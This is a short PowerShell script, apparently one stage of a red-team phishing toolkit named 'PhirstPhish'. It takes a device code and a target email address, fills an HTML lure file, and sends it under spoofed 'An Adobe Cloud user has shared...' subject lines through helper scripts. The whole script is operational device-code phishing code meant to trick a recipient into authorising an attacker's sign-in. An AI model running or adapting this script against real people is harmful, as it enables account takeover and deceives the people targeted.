[CmdletBinding()]
param(
    [Parameter(Mandatory=$false)]
    [string]$code,
    [Parameter(Mandatory=$false)]
    [string]$subject,
    [Parameter(Mandatory=$false)]
    [string]$firstUser
)

if(!($code)){ $code = Read-Host "Enter Device code from PhirstPhish step" }
if(!($firstUser)){ $firstUser = Read-Host "Enter target email address"}
.\Replace.ps1 -code $code
$messageContent2 = Get-Content bluebeam.htm -Raw

$subjects = @(
    "An Adobe Cloud user has shared 'Upcoming Fine-ass Downtown Construction Project: Key Details and Timeline for Playas' with you.",
    "An Adobe Cloud user has shared 'Invitation: Steakholder Meeting on Downtown Development Plans. B.Y.O.Steak!' with you.",
    "An Adobe Cloud user has shared 'Progress Update: Where are the gay robots?? It's November.' with you.",
    "An Adobe Cloud user has shared 'Embassy Renovation Supplemental Instruction Plan and General Guidelines: Ya Done Goofed.' with you."
)

if(!($subject)){ $subject = $subject = Get-Random -InputObject $subjects} 
.\Second.ps1 -targetUser $firstUser -messageContent $messageContent2 -subject $subject